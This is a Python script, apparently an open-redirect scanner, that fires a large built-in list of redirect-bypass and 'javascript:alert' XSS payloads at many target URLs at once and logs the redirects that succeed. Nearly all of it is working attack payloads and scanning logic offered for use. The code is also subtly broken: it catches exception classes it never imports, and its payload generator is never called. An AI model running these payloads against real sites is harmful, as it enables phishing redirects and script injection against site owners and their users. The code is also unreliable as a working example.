import aiofiles
import asyncio
import aiohttp
import argparse
import sys
import datetime
import socket
from aiohttp import ClientConnectorError, ClientOSError, ServerDisconnectedError, ServerTimeoutError
from tqdm import tqdm
from urllib.parse import urlparse, quote, urlunparse
from typing import List
from bs4 import BeautifulSoup
from tqdm.asyncio import tqdm

LIGHT_GREEN = '\033[92m'
DARK_GREEN = '\033[32m'
RED = '\033[91m'
ENDC = '\033[0m'
lock = asyncio.Lock()

def generate_bypass_payloads(base_url: str) -> List[str]:
    encoded_dot = "%E3%80%82"  # Bypass "." blacklist
    null_byte = "%00"
    
    payloads = [
        "www.whitelisted.com.evil.com",
        "java%0d%0ascript%0d%0a:alert(0)",
        "//google.com",
        "////google.com",
        "https:google.com",
        r"\/\/google.com/",
        r"/\/google.com/",
        f"//google{encoded_dot}com",
        f"//google{null_byte}.com",
        "?next=whitelisted.com&next=google.com",
        "http://www.theirsite.com@yoursite.com/",
        f"{base_url}?http://www.theirsite.com/",
        f"{base_url}/folder/www.folder.com",
        "https://evil.c℀.example.com",
        "/%09/example.com",
        "/%2f%2fexample.com",
        "/%2f%2f%2fbing.com%2f%3fwww.omise.co",
        "/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/",
        "/%5cexample.com",
        "/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d",
        "//%09/example.com",
        "//%5cexample.com",
        "///%09/example.com",
        "///%5cexample.com",
        "////%09/example.com",
        "////%5cexample.com",
        "/////example.com",
        "/////example.com/",
        r"////\;@example.com",
        "////example.com/",
        "////example.com/%2e%2e",
        "////example.com/%2e%2e%2f",
        "////example.com/%2f%2e%2e",
        "////example.com/%2f..",
        "////example.com//",
        r"///\;@example.com",
        "///example.com",
        "///example.com/",
        "//google.com/%2f..",
        "//www.whitelisteddomain.tld@google.com/%2f..",
        "///google.com/%2f..",
        "///www.whitelisteddomain.tld@google.com/%2f..",
        "////google.com/%2f..",
        "////www.whitelisteddomain.tld@google.com/%2f..",
        "https://google.com/%2f..",
        "https://www.whitelisteddomain.tld@google.com/%2f..",
        "/https://google.com/%2f..",
        "/https://www.whitelisteddomain.tld@google.com/%2f..",
        "//www.google.com/%2f%2e%2e",
        "//www.whitelisteddomain.tld@www.google.com/%2f%2e%2e",
        "///www.google.com/%2f%2e%2e",
        "///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e",
        "////www.google.com/%2f%2e%2e",
        "////www.whitelisteddomain.tld@www.google.com/%2f%2e%2e",
        "https://www.google.com/%2f%2e%2e",
        "https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e",
        "/https://www.google.com/%2f%2e%2e",
        "/https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e",
        "//google.com/",
        "//www.whitelisteddomain.tld@google.com/",
        "///google.com/",
        "///www.whitelisteddomain.tld@google.com/",
        "////google.com/",
        "////www.whitelisteddomain.tld@google.com/",
        "https://google.com/",
        "https://www.whitelisteddomain.tld@google.com/",
        "/https://google.com/",
        "/https://www.whitelisteddomain.tld@google.com/",
        "//google.com//",
        "//www.whitelisteddomain.tld@google.com//",
        "///google.com//",
        "///www.whitelisteddomain.tld@google.com//",
        "////google.com//",
        "////www.whitelisteddomain.tld@google.com//",
        "https://google.com//",
        "https://www.whitelisteddomain.tld@google.com//",
        "//https://google.com//",
        "//https://www.whitelisteddomain.tld@google.com//",
        "//www.google.com/%2e%2e%2f",
        "//www.whitelisteddomain.tld@www.google.com/%2e%2e%2f",
        "///www.google.com/%2e%2e%2f",
        "///www.whitelisteddomain.tld@www.google.com/%2e%2e%2f",
        "////www.google.com/%2e%2e%2f",
        "////www.whitelisteddomain.tld@www.google.com/%2e%2e%2f",
        "https://www.google.com/%2e%2e%2f",
        "https://www.whitelisteddomain.tld@www.google.com/%2e%2e%2f",
        "//https://www.google.com/%2e%2e%2f",
        "//https://www.whitelisteddomain.tld@www.google.com/%2e%2e%2f",
        "//https:///www.google.com/%2e%2e",
        "//www.whitelisteddomain.tld@https:///www.google.com/%2e%2e",
        "/https://www.google.com/%2e%2e",
        "/https://www.whitelisteddomain.tld@www.google.com/%2e%2e",
        "/https:///www.google.com/%2e%2e",
        "/https:///www.whitelisteddomain.tld@www.google.com/%2e%2e",
        "//%09/google.com",
        "//%09/www.whitelisteddomain.tld@google.com",
        "///%09/google.com",
        "///%09/www.whitelisteddomain.tld@google.com",
        "////%09/google.com",
        "////%09/www.whitelisteddomain.tld@google.com",
        "https://%09/google.com",
        "https://%09/www.whitelisteddomain.tld@google.com",
        "/%5cgoogle.com",
        "/%5cwww.whitelisteddomain.tld@google.com",
        "//%5cgoogle.com",
        "//%5cwww.whitelisteddomain.tld@google.com",
        "///%5cgoogle.com",
        "///%5cwww.whitelisteddomain.tld@google.com",
        "////%5cgoogle.com",
        "////%5cwww.whitelisteddomain.tld@google.com",
        "https://%5cgoogle.com",
        "https://%5cwww.whitelisteddomain.tld@google.com",
        "/https://%5cgoogle.com",
        "/https://%5cwww.whitelisteddomain.tld@google.com",
        "https://google.com",
        "https://www.whitelisteddomain.tld@google.com",
        "javascript:alert(1);",
        "javascript:alert(1)",
        "//javascript:alert(1);",
        "/javascript:alert(1);",
        "//javascript:alert(1)/",
        "/javascript:alert(1)/",
        "/%5cjavascript:alert(1);",
        "/%5cjavascript:alert(1)",
        "//%5cjavascript:alert(1);",
        "//%5cjavascript:alert(1)",
        "/%09/javascript:alert(1);",
        "/%09/javascript:alert(1)",
        "java%0d%0ascript%0d%0a:alert(0)",
        "//google.com",
        "https:google.com",
        "//google%E3%80%82com",
        r"\/\/google.com/",
        r"/\/google.com/",
        r"//google%00.com",
        "https://www.whitelisteddomain.tld/https://www.google.com/",
        "\";alert(0);//",
        "javascript://www.whitelisteddomain.tld?%a0alert%281%29",
        "http://0xd8.0x3a.0xd6.0xce",
        "http://www.whitelisteddomain.tld@0xd8.0x3a.0xd6.0xce",
        "http://3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce",
        "http://XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce",
        "http://0xd83ad6ce",
        "http://www.whitelisteddomain.tld@0xd83ad6ce",
        "http://3H6k7lIAiqjfNeN@0xd83ad6ce",
        "http://XY>.7d8T\205pZM@0xd83ad6ce",
        "http://3627734734",
        "http://www.whitelisteddomain.tld@3627734734",
        "http://3H6k7lIAiqjfNeN@3627734734",
        "http://XY>.7d8T\205pZM@3627734734",
        "http://472.314.470.462",
        "http://www.whitelisteddomain.tld@472.314.470.462",
        "http://3H6k7lIAiqjfNeN@472.314.470.462",
        "http://XY>.7d8T\205pZM@472.314.470.462",
        "http://0330.072.0326.0316",
        "http://www.whitelisteddomain.tld@0330.072.0326.0316",
        "http://3H6k7lIAiqjfNeN@0330.072.0326.0316",
        "http://XY>.7d8T\205pZM@0330.072.0326.0316",
        "http://00330.00072.0000326.00000316",
        "http://www.whitelisteddomain.tld@00330.00072.0000326.00000316",
        "http://3H6k7lIAiqjfNeN@00330.00072.0000326.00000316",
        "http://XY>.7d8T\205pZM@00330.00072.0000326.00000316",
        "http://[::216.58.214.206]",
        "http://www.whitelisteddomain.tld@[::216.58.214.206]",
        "http://3H6k7lIAiqjfNeN@[::216.58.214.206]",
        "http://XY>.7d8T\205pZM@[::216.58.214.206]",
        "http://[::ffff:216.58.214.206]",
        "http://www.whitelisteddomain.tld@[::ffff:216.58.214.206]",
        "http://3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]",
        "http://XY>.7d8T\205pZM@[::ffff:216.58.214.206]",
        "http://0xd8.072.54990",
        "http://www.whitelisteddomain.tld@0xd8.072.54990",
        "http://3H6k7lIAiqjfNeN@0xd8.072.54990",
        "http://XY>.7d8T\\205pZM@0xd8.072.54990",
        "http://0xd8.3856078",
        "http://www.whitelisteddomain.tld@0xd8.3856078",
        "http://3H6k7lIAiqjfNeN@0xd8.3856078",
        "http://XY>.7d8T\\205pZM@0xd8.3856078",
        "http://00330.3856078",
        "http://www.whitelisteddomain.tld@00330.3856078",
        "http://3H6k7lIAiqjfNeN@00330.3856078",
        "http://XY>.7d8T\\205pZM@00330.3856078",
        "http://00330.0x3a.54990",
        "http://www.whitelisteddomain.tld@00330.0x3a.54990",
        "http://3H6k7lIAiqjfNeN@00330.0x3a.54990",
        "http://XY>.7d8T\\205pZM@00330.0x3a.54990",
        "http:0xd8.0x3a.0xd6.0xce",
        "http:www.whitelisteddomain.tld@0xd8.0x3a.0xd6.0xce",
        "http:3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce",
        "http:XY>.7d8T\\205pZM@0xd8.0x3a.0xd6.0xce",
        "http:0xd83ad6ce",
        "http:www.whitelisteddomain.tld@0xd83ad6ce",
        "http:3H6k7lIAiqjfNeN@0xd83ad6ce",
        "http:XY>.7d8T\\205pZM@0xd83ad6ce",
        "http:3627734734",
        "http:www.whitelisteddomain.tld@3627734734",
        "http:3H6k7lIAiqjfNeN@3627734734",
        "http:XY>.7d8T\\205pZM@3627734734",
        "http:472.314.470.462",
        "http:www.whitelisteddomain.tld@472.314.470.462",
        "http:3H6k7lIAiqjfNeN@472.314.470.462",
        "http:XY>.7d8T\\205pZM@472.314.470.462",
        "http:[::216.58.214.206]",
        "http:www.whitelisteddomain.tld@[::216.58.214.206]",
        "http:3H6k7lIAiqjfNeN@[::216.58.214.206]",
        "http:XY>.7d8T\\205pZM@[::216.58.214.206]",
        "http:[::ffff:216.58.214.206]",
        "http:www.whitelisteddomain.tld@[::ffff:216.58.214.206]",
        "http:3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]",
        "http:XY>.7d8T\\205pZM@[::ffff:216.58.214.206]",
        "//google.com",
        "//example.com",
        "//example.com/",
        "//google%00.com",
        "//google%E3%80%82com",
        "<>javascript:alert(1);",
        "\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)",
        "\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)",
        "ja\nva\tscript\r:alert(1)",
        r"\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)",
        "\152\141\166\141\163\143\162\151\160\164\072alert(1)",
        "///example.com/%2e%2e",
        "///example.com/%2e%2e%2f",
        "///example.com/%2f%2e%2e",
        "///example.com/%2f..",
        "///example.com//",
        "//https:///example.com/%2e%2e",
        "//https://example.com/%2e%2e%2f",
        "//https://example.com//",
        "/<>//example.com"
    ]
    
    params = [
        "checkout_url", "continue", "dest", "destination", "go", "image_url",
        "next", "redir", "redirect_uri", "redirect_url", "redirect",
        "return_path", "return_to", "return", "returnTo", "rurl", "target",
        "url", "view"
    ]
    
    parameterized_payloads = [f"?{param}={quote(payload)}" for param in params for payload in payloads]
    path_payloads = [f"/{payload}" for payload in payloads] + [f"/redirect/{payload}" for payload in payloads]
    
    return payloads + parameterized_payloads + path_payloads

async def log_success(filled_url, locations):
    async with lock:
        async with aiofiles.open('/app/successdomain.txt', mode='a') as f:
            await f.write(f"{locations}\n")
            
async def fetch_page_content(session, url):
    """Fetch the HTML content of a page."""
    async with session.get(url) as response:
        return await response.text() if response.status == 200 else ""

async def extract_metadata(html):
    """Extract the title, meta description, headers, and visible content from the page."""
    soup = BeautifulSoup(html, 'html.parser')

    title = soup.title.string if soup.title else "No Title"
    
    meta_desc = soup.find("meta", attrs={"name": "description"})
    meta_desc = meta_desc["content"] if meta_desc else "No Meta Description"

    headers = [h.get_text(strip=True) for h in soup.find_all(['h1', 'h2', 'h3'])]
    paragraphs = [p.get_text(strip=True) for p in soup.find_all('p')[:3]]  # Limit to first 3 paragraphs
    links = [a['href'] for a in soup.find_all('a', href=True)[:5]]  # Limit to first 5 links
    images = [img['src'] for img in soup.find_all('img', src=True)[:3]]  # Limit to first 3 images

    # Extract main visible text from the webpage (excluding scripts, styles, etc.)
    visible_text = soup.get_text(separator=' ', strip=True)

    return title, meta_desc, headers, paragraphs, links, images, visible_text

async def fetch_url(session, url):
    try:
        async with session.head(url, allow_redirects=True, timeout=10) as response:
            # Return both status code and redirect history
            return response.status, response.history

    except ClientConnectorError as e:
        tqdm.write(
            f"[ERROR] Connection refused: {url} - Likely denied access. ({e})", file=sys.stderr)
        return "Connection Refused", None

    except ServerConnectionError:
        tqdm.write(
            f"[ERROR] {url} - Server Connection Error. Possibly blocked by firewall.", file=sys.stderr)
        return "Server Connection Error", None

    except ServerTimeoutError:
        tqdm.write(
            f"[ERROR] {url} - Request Timed Out. Server may be unreachable.", file=sys.stderr)
        return "Timeout", None

    except TooManyRedirects:
        tqdm.write(
            f"[ERROR] {url} - Too many redirects. Could be a security measure.", file=sys.stderr)
        return "Too Many Redirects", None

    except UnicodeDecodeError:
        tqdm.write(
            f"[ERROR] {url} - Encoding issue detected.", file=sys.stderr)
        return "Encoding Error", None
    except socket.gaierror as e:
        tqdm.write(
            f"[ERROR] DNS Resolution Failed: {url} - {e}", file=sys.stderr)
        return "DNS Error", None

    except Exception as e:
        tqdm.write(f"[ERROR] {url} - Unexpected error: {e}", file=sys.stderr)
        return "Unknown Error", None


async def process_url(semaphore, session, url, bypass_payloads, pbar):
    async with semaphore:
        for payload in bypass_payloads:
            modified_url = f"{url}{payload}"
            status, history = await fetch_url(session, modified_url)
            base_message = f"Payload: {payload} | URL: {modified_url}"
            
            html = await fetch_page_content(session, modified_url)
            title, meta_desc, headers, paragraphs, links, images, visible_text = await extract_metadata(html)
            
            if status == 200 and history:
                locations = " --> ".join(str(r.url) for r in history)
                tqdm.write(f"{DARK_GREEN}[SUCCESS]{ENDC} {LIGHT_GREEN}{base_message} redirects to {locations}{ENDC}")
                tqdm.write(f"Title: {title}")
                tqdm.write(f"Meta Description: {meta_desc}")
                tqdm.write(f"Headers: {headers}")
                tqdm.write(f"Paragraphs: {paragraphs}")
                tqdm.write(f"Links: {links}")
                tqdm.write(f"Images: {images}")
                tqdm.write(f"Visible Text: {visible_text[:500]}")  # Show first 500 characters
                tqdm.write("\n" + "-"*80 + "\n")  # Separator for readability
                await log_success(modified_url, locations)
            elif status == 200:
                tqdm.write(f"{RED}[SUCCESS]{ENDC} {base_message} - 200 OK (No Redirects)")
            elif history:
                locations = " --> ".join(str(r.url) for r in history)
                tqdm.write(f"{DARK_GREEN}[FOUND]{ENDC} {LIGHT_GREEN}{base_message} redirects to {locations}{ENDC}")
                tqdm.write(f"Title: {title}")
                tqdm.write(f"Meta Description: {meta_desc}")
                tqdm.write(f"Headers: {headers}")
                tqdm.write(f"Paragraphs: {paragraphs}")
                tqdm.write(f"Links: {links}")
                tqdm.write(f"Images: {images}")
                tqdm.write(f"Visible Text: {visible_text[:500]}")  # Show first 500 characters
                tqdm.write("\n" + "-"*80 + "\n")  # Separator for readability
                await log_success(modified_url, locations)
            else:
                tqdm.write(f"[ERROR] {base_message} - {status}")
            
            pbar.update()

async def process_urls(semaphore, session, urls, payloads):
    total_tasks = len(urls) * len(payloads)
    
    with tqdm(total=total_tasks, ncols=80, desc='Processing', unit='url', position=0, dynamic_ncols=True) as pbar:
        start_time = datetime.datetime.now()
        
        tasks = []
        for url in urls:
            task = process_url(semaphore, session, url, payloads, pbar)
            tasks.append(task)

            # Calculate and show estimated remaining time dynamically
            elapsed_time = datetime.datetime.now() - start_time
            avg_time_per_url = elapsed_time.total_seconds() / max(1, pbar.n)  # Avoid division by zero
            estimated_remaining = avg_time_per_url * (total_tasks - pbar.n)
            tqdm.write(f"Estimated time remaining: {estimated_remaining:.2f} seconds", end='\r')  # Keep it updating on the same line

        await asyncio.gather(*tasks, return_exceptions=True)
        
        # Final estimated time print after completion
        elapsed_time = datetime.datetime.now() - start_time
        tqdm.write(f"\nTotal processing time: {elapsed_time.total_seconds():.2f} seconds")


async def main(args):
    urls = load_urls(args.input)
    payloads = load_payloads('/app/payloads.txt')
    async with aiohttp.ClientSession() as session:
        semaphore = asyncio.Semaphore(args.concurrency)
        await process_urls(semaphore, session, urls, payloads)

def load_urls(file_path: str) -> List[str]:
    with open(file_path, 'r', encoding='utf-8') as f:
        return [line.strip() for line in f if line.strip()]

def load_payloads(file_path: str) -> List[str]:
    with open(file_path, 'r', encoding='utf-8') as f:
        return [line.strip() for line in f if line.strip()]

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Open Redirect Tester")
    parser.add_argument('-i', '--input', required=True, help='Input file containing URLs')
    parser.add_argument('-c', '--concurrency', type=int, default=100, help='Number of concurrent tasks')
    args = parser.parse_args()

    try:
        asyncio.run(main(args))
    except KeyboardInterrupt:
        print("\nInterrupted by user. Exiting...")
        sys.exit(0)
